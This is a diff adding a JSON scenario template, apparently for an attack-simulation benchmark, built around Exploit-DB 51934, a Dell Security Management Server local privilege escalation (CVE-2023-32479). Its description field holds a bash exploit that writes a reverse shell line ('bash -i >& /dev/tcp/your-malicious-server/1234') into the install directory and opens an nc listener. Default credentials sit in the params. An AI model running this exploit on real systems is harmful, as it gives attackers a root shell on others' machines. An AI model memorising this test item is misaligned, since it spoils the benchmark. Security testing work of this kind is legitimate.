@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_51934",
+  "category": "C2_systemd",
+  "attack_technique": "T1543.002",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Dell Security Management Server <1.9.0 - Local Privilege Escalation\n\nExploit source code (51934.sh):\n```\n# Exploit Title: [title] Dell Security Management Server versions prior to\n11.9.0\n# Exploit Author: [author] Amirhossein Bahramizadeh\n# CVE : [if applicable] CVE-2023-32479\nDell Encryption, Dell Endpoint Security Suite Enterprise, and Dell Security\nManagement\nServer versions prior to 11.9.0 contain privilege escalation vulnerability\ndue to improper ACL of the non-default installation directory. A local\nmalicious user could potentially exploit this vulnerability by replacing\nbinaries in installed directory and taking the reverse shell of the system\nleading to Privilege Escalation.\n\n#!/bin/bash\n\nINSTALL_DIR=\"/opt/dell\"\n\n# Check if the installed directory has improper ACLs\nif [ -w \"$INSTALL_DIR\" ]; then\n    # Replace a binary in the installed directory with a malicious binary that opens a reverse shell\n    echo \"#!/bin/bash\" > \"$INSTALL_DIR/dell-exploit\"\n    echo \"bash -i >& /dev/tcp/your-malicious-server/1234 0>&1\" >> \"$INSTALL_DIR/dell-exploit\"\n    chmod +x \"$INSTALL_DIR/dell-exploit\"\n\n    # Wait for the reverse shell to connect to your malicious server\n    nc -lvnp 1234\nfi\n```",
+  "cve": "",
+  "exploitdb_id": "51934",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_51934",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
